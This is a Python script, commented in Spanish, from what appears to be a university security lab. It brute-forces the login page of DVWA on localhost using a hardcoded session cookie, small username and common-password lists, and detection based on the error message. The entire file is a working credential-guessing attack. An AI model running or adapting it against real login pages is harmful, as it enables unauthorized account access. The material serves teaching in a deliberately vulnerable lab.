#!/usr/bin/env python3
"""
Brute force contra DVWA (vulnerabilities/brute)
Uso educativo - Laboratorio de Criptografia y Seguridad en redes
"""

import itertools
import time
import requests

# --- Configuración ---
BASE_URL = "http://localhost:8080"
BRUTE_URL = f"{BASE_URL}/vulnerabilities/brute/"

# Diccionarios de prueba
USERS = ["admin", "gordonb", "1337", "pablo", "smithy", "root", "test"]
PASSWORDS = [
    "password",
    "abc123",
    "charley",
    "letmein",
    "123456",
    "admin",
    "qwerty",
    "111111",
    "iloveyou",
    "dragon",
]


def obtener_sesion():
  """Inyecta directamente la cookie de sesión activa y el nivel de seguridad

  para asegurar el acceso al módulo vulnerable.
  """
  s = requests.Session()

  # REEMPLAZA ESTE PHPSESSID por el mismo que usaste en Hydra o en tu navegador
  s.cookies.set("PHPSESSID", "q1ttmlnqr44qp11mp75jefnm56") # Cookie extraida de sesion activa
  s.cookies.set("security", "low")

  print("[+] Sesión configurada con la cookie activa de DVWA")
  return s


def intento_login(session, usuario, password):
  """Realiza un intento de login contra vulnerabilities/brute utilizando parámetros GET.

  Detección de éxito: si el mensaje de error de DVWA no aparece en la respuesta.
  """
  params = {"username": usuario, "password": password, "Login": "Login"}

  r = session.get(BRUTE_URL, params=params, timeout=10)

  # Si el mensaje de error clásico NO está presente, las credenciales son correctas
  if "Username and/or password incorrect" not in r.text:
    return True, r
  return False, r


def main():
  session = obtener_sesion()
  encontrados = []
  total = len(USERS) * len(PASSWORDS)
  inicio = time.time()
  intentos = 0

  print(f"\n[*] Iniciando fuerza bruta: {total} combinaciones...\n")

  for usuario, password in itertools.product(USERS, PASSWORDS):
    intentos += 1
    exito, resp = intento_login(session, usuario, password)

    if exito:
      print(
          f"\n[+] ¡VÁLIDO ENCONTRADO! ({intentos}/{total}): {usuario}:{password}"
          f" (HTTP {resp.status_code})"
      )
      encontrados.append((usuario, password))
    else:
      print(
          f"[-] Falló ({intentos}/{total}): {usuario}:{password}"
          f" (HTTP {resp.status_code})",
          end="\r",
      )

  duracion = time.time() - inicio
  print(f"\n\n[+] Combinaciones válidas encontradas: {len(encontrados)}")
  for u, p in encontrados:
    print(f"    -> {u}:{p}")
  print(
      f"[+] Rendimiento: {intentos/duracion:.2f} intentos/seg "
      f"({intentos} intentos en {duracion:.2f}s)"
  )


if __name__ == "__main__":
  main()
